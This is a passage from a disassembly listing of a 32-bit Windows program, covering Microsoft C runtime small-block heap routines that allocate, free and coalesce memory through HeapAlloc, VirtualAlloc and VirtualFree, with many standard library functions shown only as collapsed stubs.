					; sub_403125+4Aj ...
		push	esi		; dwBytes
		push	8		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapAlloc
		mov	edi, eax
		test	edi, edi
		jnz	short loc_4031C9

loc_4031A5:				; CODE XREF: sub_403125+26j
		cmp	dword_409C18, 0
		jz	short loc_4031C9
		push	esi
		call	__callnewh
		test	eax, eax
		pop	ecx
		jz	short loc_4031D2
		jmp	short loc_403146
; ---------------------------------------------------------------------------

loc_4031BB:				; CODE XREF: sub_403125+48j
		push	[ebp+arg_0]	; size_t

loc_4031BE:				; CODE XREF: sub_403125+ABj
		push	0		; int
		push	edi		; void *
		call	_memset
		add	esp, 0Ch

loc_4031C9:				; CODE XREF: sub_403125+7Ej
					; sub_403125+87j
		mov	eax, edi

loc_4031CB:				; CODE XREF: sub_403125+AFj
		pop	edi
		pop	esi
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_4031CF:				; CODE XREF: sub_403125+69j
		push	esi
		jmp	short loc_4031BE
; ---------------------------------------------------------------------------

loc_4031D2:				; CODE XREF: sub_403125+92j
		xor	eax, eax
		jmp	short loc_4031CB
sub_403125	endp

; [00000058 BYTES: COLLAPSED FUNCTION __fcloseall. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000009A BYTES: COLLAPSED FUNCTION __lseek. PRESS CTRL-NUMPAD+ TO EXPAND]
; [000001AD BYTES: COLLAPSED FUNCTION __write. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000044 BYTES: COLLAPSED FUNCTION __getbuf.	PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000199 BYTES: COLLAPSED FUNCTION __setmbcp. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000335 BYTES: COLLAPSED FUNCTION _memcpy. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION _strtol. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000208 BYTES: COLLAPSED FUNCTION _strtoxl.	PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [00000005 BYTES: COLLAPSED CHUNK OF FUNCTION _strchr.	PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [000000BC BYTES: COLLAPSED FUNCTION _strchr. PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [00000080 BYTES: COLLAPSED FUNCTION _strstr. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000038 BYTES: COLLAPSED FUNCTION _strncmp.	PRESS CTRL-NUMPAD+ TO EXPAND]
		align 10h
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000048 BYTES: COLLAPSED FUNCTION ___sbh_heap_init.	PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_404122	proc near		; CODE XREF: sub_402EDD+23p

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		mov	ecx, [ebp+arg_0]
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		mov	eax, [ecx+10h]
		push	edi
		mov	edi, esi
		add	esi, 0FFFFFFFCh
		sub	edi, [ecx+0Ch]
		shr	edi, 0Fh
		mov	ecx, edi
		imul	ecx, 204h
		lea	ecx, [ecx+eax+144h]
		mov	[ebp+var_10], ecx
		mov	ecx, [esi]
		dec	ecx
		test	cl, 1
		mov	[ebp+var_4], ecx
		jnz	loc_404446
		mov	edx, [ecx+esi]
		lea	ebx, [ecx+esi]
		mov	[ebp+var_C], edx
		mov	edx, [esi-4]
		mov	[ebp+var_8], edx
		mov	edx, [ebp+var_C]
		test	dl, 1
		mov	[ebp+arg_4], ebx
		jnz	short loc_4041F8
		sar	edx, 4
		dec	edx
		cmp	edx, 3Fh
		jbe	short loc_404186
		push	3Fh
		pop	edx

loc_404186:				; CODE XREF: sub_404122+5Fj
		mov	ecx, [ebx+4]
		cmp	ecx, [ebx+8]
		jnz	short loc_4041DA
		cmp	edx, 20h
		jnb	short loc_4041B1
		mov	ebx, 80000000h
		mov	ecx, edx
		shr	ebx, cl
		lea	ecx, [edx+eax+4]
		not	ebx
		and	[eax+edi*4+44h], ebx
		dec	byte ptr [ecx]
		jnz	short loc_4041D2
		mov	ecx, [ebp+arg_0]
		and	[ecx], ebx
		jmp	short loc_4041D2
; ---------------------------------------------------------------------------

loc_4041B1:				; CODE XREF: sub_404122+6Fj
		lea	ecx, [edx-20h]
		mov	ebx, 80000000h
		shr	ebx, cl
		lea	ecx, [edx+eax+4]
		not	ebx
		and	[eax+edi*4+0C4h], ebx
		dec	byte ptr [ecx]
		jnz	short loc_4041D2
		mov	ecx, [ebp+arg_0]
		and	[ecx+4], ebx

loc_4041D2:				; CODE XREF: sub_404122+86j
					; sub_404122+8Dj ...
		mov	ecx, [ebp+var_4]
		mov	ebx, [ebp+arg_4]
		jmp	short loc_4041DD
; ---------------------------------------------------------------------------

loc_4041DA:				; CODE XREF: sub_404122+6Aj
		mov	ecx, [ebp+var_4]

loc_4041DD:				; CODE XREF: sub_404122+B6j
		mov	edx, [ebx+8]
		mov	ebx, [ebx+4]
		add	ecx, [ebp+var_C]
		mov	[edx+4], ebx
		mov	edx, [ebp+arg_4]
		mov	[ebp+var_4], ecx
		mov	ebx, [edx+4]
		mov	edx, [edx+8]
		mov	[ebx+8], edx

loc_4041F8:				; CODE XREF: sub_404122+56j
		mov	edx, ecx
		sar	edx, 4
		dec	edx
		cmp	edx, 3Fh
		jbe	short loc_404206
		push	3Fh
		pop	edx

loc_404206:				; CODE XREF: sub_404122+DFj
		mov	ebx, [ebp+var_8]
		and	ebx, 1
		mov	[ebp+var_C], ebx
		jnz	loc_4042A9
		sub	esi, [ebp+var_8]
		mov	ebx, [ebp+var_8]
		sar	ebx, 4
		push	3Fh
		mov	[ebp+arg_4], esi
		dec	ebx
		pop	esi
		cmp	ebx, esi
		jbe	short loc_40422B
		mov	ebx, esi

loc_40422B:				; CODE XREF: sub_404122+105j
		add	ecx, [ebp+var_8]
		mov	edx, ecx
		mov	[ebp+var_4], ecx
		sar	edx, 4
		dec	edx
		cmp	edx, esi
		jbe	short loc_40423D
		mov	edx, esi

loc_40423D:				; CODE XREF: sub_404122+117j
		cmp	ebx, edx
		jz	short loc_4042A4
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+4]
		cmp	esi, [ecx+8]
		jnz	short loc_40428C
		cmp	ebx, 20h
		jnb	short loc_40426D
		mov	esi, 80000000h
		mov	ecx, ebx
		shr	esi, cl
		not	esi
		and	[eax+edi*4+44h], esi
		dec	byte ptr [ebx+eax+4]
		jnz	short loc_40428C
		mov	ecx, [ebp+arg_0]
		and	[ecx], esi
		jmp	short loc_40428C
; ---------------------------------------------------------------------------

loc_40426D:				; CODE XREF: sub_404122+12Dj
		lea	ecx, [ebx-20h]
		mov	esi, 80000000h
		shr	esi, cl
		not	esi
		and	[eax+edi*4+0C4h], esi
		dec	byte ptr [ebx+eax+4]
		jnz	short loc_40428C
		mov	ecx, [ebp+arg_0]
		and	[ecx+4], esi

loc_40428C:				; CODE XREF: sub_404122+128j
					; sub_404122+142j ...
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+8]
		mov	ecx, [ecx+4]
		mov	[esi+4], ecx
		mov	ecx, [ebp+arg_4]
		mov	esi, [ecx+4]
		mov	ecx, [ecx+8]
		mov	[esi+8], ecx

loc_4042A4:				; CODE XREF: sub_404122+11Dj
		mov	esi, [ebp+arg_4]
		jmp	short loc_4042AC
; ---------------------------------------------------------------------------

loc_4042A9:				; CODE XREF: sub_404122+EDj
		mov	ebx, [ebp+arg_0]

loc_4042AC:				; CODE XREF: sub_404122+185j
		cmp	[ebp+var_C], 0
		jnz	short loc_4042BA
		cmp	ebx, edx
		jz	loc_40433B

loc_4042BA:				; CODE XREF: sub_404122+18Ej
		mov	ecx, [ebp+var_10]
		mov	ebx, [ecx+edx*8+4]
		lea	ecx, [ecx+edx*8]
		mov	[esi+4], ebx
		mov	[esi+8], ecx
		mov	[ecx+4], esi
		mov	ecx, [esi+4]
		mov	[ecx+8], esi
		mov	ecx, [esi+4]
		cmp	ecx, [esi+8]
		jnz	short loc_40433B
		mov	cl, [edx+eax+4]
		cmp	edx, 20h
		mov	byte ptr [ebp+arg_4+3],	cl
		inc	cl
		mov	[edx+eax+4], cl
		jnb	short loc_404312
		cmp	byte ptr [ebp+arg_4+3],	0
		jnz	short loc_404301
		mov	ebx, 80000000h
		mov	ecx, edx
		shr	ebx, cl
		mov	ecx, [ebp+arg_0]
		or	[ecx], ebx

loc_404301:				; CODE XREF: sub_404122+1CFj
		mov	ebx, 80000000h
		mov	ecx, edx
		shr	ebx, cl
		lea	eax, [eax+edi*4+44h]
		or	[eax], ebx
		jmp	short loc_40433B
; ---------------------------------------------------------------------------

loc_404312:				; CODE XREF: sub_404122+1C9j
		cmp	byte ptr [ebp+arg_4+3],	0
		jnz	short loc_404328
		lea	ecx, [edx-20h]
		mov	ebx, 80000000h
		shr	ebx, cl
		mov	ecx, [ebp+arg_0]
		or	[ecx+4], ebx

loc_404328:				; CODE XREF: sub_404122+1F4j
		lea	ecx, [edx-20h]
		mov	edx, 80000000h
		shr	edx, cl
		lea	eax, [eax+edi*4+0C4h]
		or	[eax], edx

loc_40433B:				; CODE XREF: sub_404122+192j
					; sub_404122+1B7j ...
		mov	eax, [ebp+var_4]
		mov	[esi], eax
		mov	[eax+esi-4], eax
		mov	eax, [ebp+var_10]
		dec	dword ptr [eax]
		jnz	loc_404446
		mov	eax, dword_409C54
		test	eax, eax
		jz	loc_404438
		mov	ecx, dword_409C4C
		mov	esi, ds:VirtualFree
		shl	ecx, 0Fh
		add	ecx, [eax+0Ch]
		mov	ebx, 8000h
		push	4000h		; dwFreeType
		push	ebx		; dwSize
		push	ecx		; lpAddress
		call	esi ; VirtualFree
		mov	ecx, dword_409C4C
		mov	eax, dword_409C54
		mov	edx, 80000000h
		shr	edx, cl
		or	[eax+8], edx
		mov	eax, dword_409C54
		mov	ecx, dword_409C4C
		mov	eax, [eax+10h]
		and	dword ptr [eax+ecx*4+0C4h], 0
		mov	eax, dword_409C54
		mov	eax, [eax+10h]
		dec	byte ptr [eax+43h]
		mov	eax, dword_409C54
		mov	ecx, [eax+10h]
		cmp	byte ptr [ecx+43h], 0
		jnz	short loc_4043C9
		and	dword ptr [eax+4], 0FFFFFFFEh
		mov	eax, dword_409C54

loc_4043C9:				; CODE XREF: sub_404122+29Cj
		cmp	dword ptr [eax+8], 0FFFFFFFFh
		jnz	short loc_404438
		push	ebx		; dwFreeType
		push	0		; dwSize
		push	dword ptr [eax+0Ch] ; lpAddress
		call	esi ; VirtualFree
		mov	eax, dword_409C54
		push	dword ptr [eax+10h] ; lpMem
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapFree
		mov	eax, dword_409C58
		mov	edx, lpMem
		lea	eax, [eax+eax*4]
		shl	eax, 2
		mov	ecx, eax
		mov	eax, dword_409C54
		sub	ecx, eax
		lea	ecx, [ecx+edx-14h]
		push	ecx		; size_t
		lea	ecx, [eax+14h]
		push	ecx		; void *
		push	eax		; void *
		call	_memcpy_0
		mov	eax, [ebp+arg_0]
		add	esp, 0Ch
		dec	dword_409C58
		cmp	eax, dword_409C54
		jbe	short loc_40442E
		sub	[ebp+arg_0], 14h

loc_40442E:				; CODE XREF: sub_404122+306j
		mov	eax, lpMem
		mov	dword_409C50, eax

loc_404438:				; CODE XREF: sub_404122+234j
					; sub_404122+2ABj
		mov	eax, [ebp+arg_0]
		mov	dword_409C4C, edi
		mov	dword_409C54, eax

loc_404446:				; CODE XREF: sub_404122+38j
					; sub_404122+227j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_404122	endp

; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS	CTRL-NUMPAD+ TO	EXPAND]
; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS CTRL-NUMPAD+ TO EXPAND]
; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_404900	proc near		; CODE XREF: sub_40293D+41p
					; sub_404BF8:loc_404DC7p
		cmp	dword_4078F0, 0FFFFFFFFh
		push	ebx
		push	ebp
		push	esi
		push	edi
		jnz	short loc_404914
		mov	esi, offset off_4078E0
		jmp	short loc_404931
; ---------------------------------------------------------------------------

loc_404914:				; CODE XREF: sub_404900+Bj
		push	2020h		; dwBytes
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapAlloc
		mov	esi, eax
		test	esi, esi
		jz	loc_404A3D

loc_404931:				; CODE XREF: sub_404900+12j
		mov	ebp, ds:VirtualAlloc
		push	4		; flProtect
		push	2000h		; flAllocationType
		push	400000h		; dwSize
		push	0		; lpAddress
		call	ebp ; VirtualAlloc
		mov	edi, eax
		test	edi, edi
		jz	loc_404A26
		push	4		; flProtect
		mov	ebx, 10000h
		push	1000h		; flAllocationType
		push	ebx		; dwSize
		push	edi		; lpAddress
		call	ebp ; VirtualAlloc
		test	eax, eax
		jz	loc_404A18
		mov	eax, offset off_4078E0
		cmp	esi, eax
		jnz	short loc_404990
		cmp	off_4078E0, 0
		jnz	short loc_404980
		mov	off_4078E0, eax

loc_404980:				; CODE XREF: sub_404900+79j
		cmp	off_4078E4, 0
		jnz	short loc_4049A5
		mov	off_4078E4, eax
		jmp	short loc_4049A5
; ---------------------------------------------------------------------------

loc_404990:				; CODE XREF: sub_404900+70j
		mov	[esi], eax
		mov	eax, off_4078E4
		mov	[esi+4], eax
		mov	off_4078E4, esi
		mov	eax, [esi+4]
		mov	[eax], esi

loc_4049A5:				; CODE XREF: sub_404900+87j
					; sub_404900+8Ej
		lea	eax, [edi+400000h]
		lea	ecx, [esi+98h]
		mov	[esi+14h], eax
		lea	eax, [esi+18h]
		mov	[esi+0Ch], ecx
		mov	[esi+10h], edi
		mov	[esi+8], eax
		xor	ebp, ebp
		mov	ecx, 0F1h

loc_4049C7:				; CODE XREF: sub_404900+E2j
		xor	edx, edx
		cmp	ebp, 10h
		setnl	dl
		dec	edx
		and	edx, ecx
		dec	edx
		inc	ebp
		mov	[eax], edx
		mov	[eax+4], ecx
		add	eax, 8
		cmp	ebp, 400h
		jl	short loc_4049C7
		push	ebx		; size_t
		push	0		; int
		push	edi		; void *
		call	_memset
		add	esp, 0Ch

loc_4049F0:				; CODE XREF: sub_404900+112j
		mov	eax, [esi+10h]
		add	eax, ebx
		cmp	edi, eax
		jnb	short loc_404A14
		or	byte ptr [edi+0F8h], 0FFh
		lea	eax, [edi+8]
		mov	[edi], eax
		mov	dword ptr [edi+4], 0F0h
		add	edi, 1000h
		jmp	short loc_4049F0
; ---------------------------------------------------------------------------

loc_404A14:				; CODE XREF: sub_404900+F7j
		mov	eax, esi
		jmp	short loc_404A3F
; ---------------------------------------------------------------------------

loc_404A18:				; CODE XREF: sub_404900+63j
		push	8000h		; dwFreeType
		push	0		; dwSize
		push	edi		; lpAddress
		call	ds:VirtualFree

loc_404A26:				; CODE XREF: sub_404900+4Bj
		cmp	esi, offset off_4078E0
		jz	short loc_404A3D
		push	esi		; lpMem
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapFree

loc_404A3D:				; CODE XREF: sub_404900+2Bj
					; sub_404900+12Cj
		xor	eax, eax

loc_404A3F:				; CODE XREF: sub_404900+116j
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		retn
sub_404900	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_404A44(LPVOID	lpMem)
sub_404A44	proc near		; CODE XREF: sub_404A9A+A5p

lpMem		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+lpMem]
		push	8000h		; dwFreeType
		push	0		; dwSize
		push	dword ptr [esi+10h] ; lpAddress
		call	ds:VirtualFree
		cmp	off_409900, esi
		jnz	short loc_404A69
		mov	eax, [esi+4]
		mov	off_409900, eax

loc_404A69:				; CODE XREF: sub_404A44+1Bj
		cmp	esi, offset off_4078E0
		jz	short loc_404A91
		mov	eax, [esi+4]
		mov	ecx, [esi]
		push	esi		; lpMem
		push	0		; dwFlags
		mov	[eax], ecx
		mov	eax, [esi]
		mov	ecx, [esi+4]
		mov	[eax+4], ecx
		push	hHeap		; hHeap
		call	ds:HeapFree
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_404A91:				; CODE XREF: sub_404A44+2Bj
		or	dword_4078F0, 0FFFFFFFFh
		pop	esi
		retn
sub_404A44	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_404A9A	proc near		; CODE XREF: sub_404BB3+3Ep

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		mov	esi, off_4078E4
		push	edi

loc_404AA7:				; CODE XREF: sub_404A9A+B7j
		cmp	dword ptr [esi+10h], 0FFFFFFFFh
		jz	loc_404B45
		and	[ebp+var_4], 0
		lea	edi, [esi+2010h]
		mov	ebx, 3FF000h

loc_404AC0:				; CODE XREF: sub_404A9A+72j
		cmp	dword ptr [edi], 0F0h
		jnz	short loc_404B01
		mov	eax, ebx
		push	4000h		; dwFreeType
		add	eax, [esi+10h]
		push	1000h		; dwSize
		push	eax		; lpAddress
		call	ds:VirtualFree
		test	eax, eax
		jz	short loc_404B01
		or	dword ptr [edi], 0FFFFFFFFh
		dec	dword_409C08
		mov	eax, [esi+0Ch]
		test	eax, eax
		jz	short loc_404AF6
		cmp	eax, edi
		jbe	short loc_404AF9

loc_404AF6:				; CODE XREF: sub_404A9A+56j
		mov	[esi+0Ch], edi

loc_404AF9:				; CODE XREF: sub_404A9A+5Aj
		inc	[ebp+var_4]
		dec	[ebp+arg_0]
		jz	short loc_404B0E

loc_404B01:				; CODE XREF: sub_404A9A+2Cj
					; sub_404A9A+46j
		sub	ebx, 1000h
		sub	edi, 8
		test	ebx, ebx
		jge	short loc_404AC0

loc_404B0E:				; CODE XREF: sub_404A9A+65j
		cmp	[ebp+var_4], 0
		mov	ecx, esi
		mov	esi, [esi+4]
		jz	short loc_404B45
		cmp	dword ptr [ecx+18h], 0FFFFFFFFh
		jnz	short loc_404B45
		push	1
		lea	eax, [ecx+20h]
		pop	edx

loc_404B25:				; CODE XREF: sub_404A9A+9Aj
		cmp	dword ptr [eax], 0FFFFFFFFh
		jnz	short loc_404B36
		inc	edx
		add	eax, 8
		cmp	edx, 400h
		jl	short loc_404B25

loc_404B36:				; CODE XREF: sub_404A9A+8Ej
		cmp	edx, 400h
		jnz	short loc_404B45
		push	ecx		; lpMem
		call	sub_404A44
		pop	ecx

loc_404B45:				; CODE XREF: sub_404A9A+11j
					; sub_404A9A+7Dj ...
		cmp	esi, off_4078E4
		jz	short loc_404B57
		cmp	[ebp+arg_0], 0
		jg	loc_404AA7

loc_404B57:				; CODE XREF: sub_404A9A+B1j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_404A9A	endp


; =============== S U B	R O U T	I N E =======================================


sub_404B5C	proc near		; CODE XREF: sub_402EDD+3Ap

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		mov	edx, offset off_4078E0
		push	esi
		mov	ecx, edx

loc_404B68:				; CODE XREF: sub_404B5C+1Cj
		cmp	eax, [ecx+10h]
		jbe	short loc_404B72
		cmp	eax, [ecx+14h]
		jb	short loc_404B7A

loc_404B72:				; CODE XREF: sub_404B5C+Fj
		mov	ecx, [ecx]
		cmp	ecx, edx
		jz	short loc_404BAF
		jmp	short loc_404B68
; ---------------------------------------------------------------------------

loc_404B7A:				; CODE XREF: sub_404B5C+14j
		test	al, 0Fh
		jnz	short loc_404BAF
		mov	esi, eax
		mov	edx, 100h
		and	esi, 0FFFh
		cmp	esi, edx
		jb	short loc_404BAF
		mov	esi, [esp+4+arg_4]
		mov	[esi], ecx
		mov	esi, [esp+4+arg_8]
		mov	ecx, eax
		and	cx, 0F000h
		sub	eax, ecx
		mov	[esi], ecx
		sub	eax, edx
		pop	esi
		sar	eax, 4
		lea	eax, [eax+ecx+8]
		retn
; ---------------------------------------------------------------------------

loc_404BAF:				; CODE XREF: sub_404B5C+1Aj
					; sub_404B5C+20j ...
		xor	eax, eax
		pop	esi
		retn
sub_404B5C	endp


; =============== S U B	R O U T	I N E =======================================


sub_404BB3	proc near		; CODE XREF: sub_402EDD+4Dp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		mov	ecx, [esp+arg_4]
		sub	ecx, [eax+10h]
		sar	ecx, 0Ch
		lea	eax, [eax+ecx*8+18h]
		mov	ecx, [esp+arg_8]
		movzx	edx, byte ptr [ecx]
		add	[eax], edx
		and	byte ptr [ecx],	0
		cmp	dword ptr [eax], 0F0h
		mov	dword ptr [eax+4], 0F1h
		jnz	short locret_404BF7
		inc	dword_409C08
		cmp	dword_409C08, 20h
		jnz	short locret_404BF7
		push	10h
		call	sub_404A9A
		pop	ecx

locret_404BF7:				; CODE XREF: sub_404BB3+2Bj
					; sub_404BB3+3Aj
		retn
sub_404BB3	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_404BF8	proc near		; CODE XREF: sub_402D36+4Ap
					; sub_403125+5Fp

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, off_409900
		push	edi

loc_404C06:				; CODE XREF: sub_404BF8+C6j
		mov	edx, [esi+10h]
		cmp	edx, 0FFFFFFFFh
		jz	loc_404CB1
		mov	edi, [esi+8]
		lea	ecx, [esi+2018h]
		mov	eax, edi
		sub	eax, esi
		sub	eax, 18h
		sar	eax, 3
		shl	eax, 0Ch
		add	eax, edx
		cmp	edi, ecx
		mov	[ebp+var_4], eax
		jnb	short loc_404C6B

loc_404C31:				; CODE XREF: sub_404BF8+6Fj
		mov	ecx, [edi]
		mov	ebx, [ebp+arg_0]
		cmp	ecx, ebx
		jl	short loc_404C54
		cmp	[edi+4], ebx
		jbe	short loc_404C54
		push	ebx
		push	ecx
		push	eax
		call	sub_404E00
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_404CC3
		mov	eax, [ebp+var_4]
		mov	[edi+4], ebx

loc_404C54:				; CODE XREF: sub_404BF8+40j
					; sub_404BF8+45j
		add	edi, 8
		lea	ecx, [esi+2018h]
		add	eax, 1000h
		cmp	edi, ecx
		mov	[ebp+var_4], eax
		jb	short loc_404C31
		jmp	short loc_404C6E
; ---------------------------------------------------------------------------

loc_404C6B:				; CODE XREF: sub_404BF8+37j
		mov	ebx, [ebp+arg_0]

loc_404C6E:				; CODE XREF: sub_404BF8+71j
		mov	eax, [esi+8]
		mov	ecx, [esi+10h]
		lea	edi, [esi+18h]
		mov	[ebp+var_8], eax
		cmp	edi, eax
		mov	[ebp+var_4], ecx
		jnb	short loc_404CB4

loc_404C81:				; CODE XREF: sub_404BF8+B5j
		mov	eax, [edi]
		cmp	eax, ebx
		jl	short loc_404CA0
		cmp	[edi+4], ebx
		jbe	short loc_404CA0
		push	ebx
		push	eax
		push	[ebp+var_4]
		call	sub_404E00
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_404CC3
		mov	[edi+4], ebx

loc_404CA0:				; CODE XREF: sub_404BF8+8Dj
					; sub_404BF8+92j
		add	[ebp+var_4], 1000h
		add	edi, 8
		cmp	edi, [ebp+var_8]
		jb	short loc_404C81
		jmp	short loc_404CB4
; ---------------------------------------------------------------------------

loc_404CB1:				; CODE XREF: sub_404BF8+14j
		mov	ebx, [ebp+arg_0]

loc_404CB4:				; CODE XREF: sub_404BF8+87j
					; sub_404BF8+B7j
		mov	esi, [esi]
		cmp	esi, off_409900
		jz	short loc_404CD3
		jmp	loc_404C06
; ---------------------------------------------------------------------------

loc_404CC3:				; CODE XREF: sub_404BF8+54j
					; sub_404BF8+A3j
		mov	off_409900, esi
		sub	[edi], ebx
		mov	[esi+8], edi
		jmp	loc_404DFB
; ---------------------------------------------------------------------------

loc_404CD3:				; CODE XREF: sub_404BF8+C4j
		mov	eax, offset off_4078E0
		mov	edi, eax

loc_404CDA:				; CODE XREF: sub_404BF8+F8j
		cmp	dword ptr [edi+10h], 0FFFFFFFFh
		jz	short loc_404CE6
		cmp	dword ptr [edi+0Ch], 0
		jnz	short loc_404CF2

loc_404CE6:				; CODE XREF: sub_404BF8+E6j
		mov	edi, [edi]
		cmp	edi, eax
		jz	loc_404DC7
		jmp	short loc_404CDA
; ---------------------------------------------------------------------------

loc_404CF2:				; CODE XREF: sub_404BF8+ECj
		mov	ebx, [edi+0Ch]
		and	[ebp+var_4], 0
		mov	esi, ebx
		mov	eax, ebx
		sub	esi, edi
		sub	esi, 18h
		sar	esi, 3
		shl	esi, 0Ch
		add	esi, [edi+10h]
		cmp	dword ptr [ebx], 0FFFFFFFFh
		jnz	short loc_404D21

loc_404D10:				; CODE XREF: sub_404BF8+127j
		cmp	[ebp+var_4], 10h
		jge	short loc_404D21
		add	eax, 8
		inc	[ebp+var_4]
		cmp	dword ptr [eax], 0FFFFFFFFh
		jz	short loc_404D10

loc_404D21:				; CODE XREF: sub_404BF8+116j
					; sub_404BF8+11Cj
		mov	eax, [ebp+var_4]
		push	4		; flProtect
		shl	eax, 0Ch
		push	1000h		; flAllocationType
		push	eax		; dwSize
		push	esi		; lpAddress
		mov	[ebp+var_8], eax
		call	ds:VirtualAlloc
		cmp	eax, esi
		jnz	loc_404DF9
		push	0		; size_t
		push	[ebp+var_8]	; int
		push	esi		; void *
		call	_memset
		mov	edx, [ebp+var_4]
		add	esp, 0Ch
		test	edx, edx
		mov	ecx, ebx
		jle	short loc_404D88
		lea	eax, [esi+4]
		mov	[ebp+var_4], edx

loc_404D5E:				; CODE XREF: sub_404BF8+18Ej
		or	byte ptr [eax+0F4h], 0FFh
		lea	edx, [eax+4]
		mov	[eax-4], edx
		mov	edx, 0F0h
		mov	[eax], edx
		mov	[ecx], edx
		mov	dword ptr [ecx+4], 0F1h
		add	eax, 1000h
		add	ecx, 8
		dec	[ebp+var_4]
		jnz	short loc_404D5E

loc_404D88:				; CODE XREF: sub_404BF8+15Ej
		mov	off_409900, edi
		lea	eax, [edi+2018h]

loc_404D94:				; CODE XREF: sub_404BF8+1A8j
		cmp	ecx, eax
		jnb	short loc_404DA4
		cmp	dword ptr [ecx], 0FFFFFFFFh
		jz	short loc_404DA2
		add	ecx, 8
		jmp	short loc_404D94
; ---------------------------------------------------------------------------

loc_404DA2:				; CODE XREF: sub_404BF8+1A3j
		cmp	ecx, eax

loc_404DA4:				; CODE XREF: sub_404BF8+19Ej
		sbb	eax, eax
		and	eax, ecx
		mov	[edi+0Ch], eax
		mov	eax, [ebp+arg_0]
		mov	[esi+8], al
		mov	[edi+8], ebx
		sub	[ebx], eax
		sub	[esi+4], eax
		lea	ecx, [esi+eax+8]
		lea	eax, [esi+100h]
		mov	[esi], ecx
		jmp	short loc_404DFB
; ---------------------------------------------------------------------------

loc_404DC7:				; CODE XREF: sub_404BF8+F2j
		call	sub_404900
		test	eax, eax
		jz	short loc_404DF9
		mov	ecx, [eax+10h]
		mov	[ecx+8], bl
		lea	edx, [ecx+ebx+8]
		mov	off_409900, eax
		mov	[ecx], edx
		mov	edx, 0F0h
		sub	edx, ebx
		mov	[ecx+4], edx
		movzx	edx, bl
		sub	[eax+18h], edx
		lea	eax, [ecx+100h]
		jmp	short loc_404DFB
; ---------------------------------------------------------------------------

loc_404DF9:				; CODE XREF: sub_404BF8+143j
					; sub_404BF8+1D6j
		xor	eax, eax

loc_404DFB:				; CODE XREF: sub_404BF8+D6j
					; sub_404BF8+1CDj ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_404BF8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_404E00	proc near		; CODE XREF: sub_404BF8+4Ap
					; sub_404BF8+99p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	ecx, [ebp+arg_0]
		mov	edx, [ebp+arg_8]
		push	ebx
		push	esi
		mov	esi, [ecx+4]
		push	edi
		mov	edi, [ecx]
		lea	ebx, [ecx+0F8h]
		cmp	esi, edx
		mov	[ebp+var_4], edi
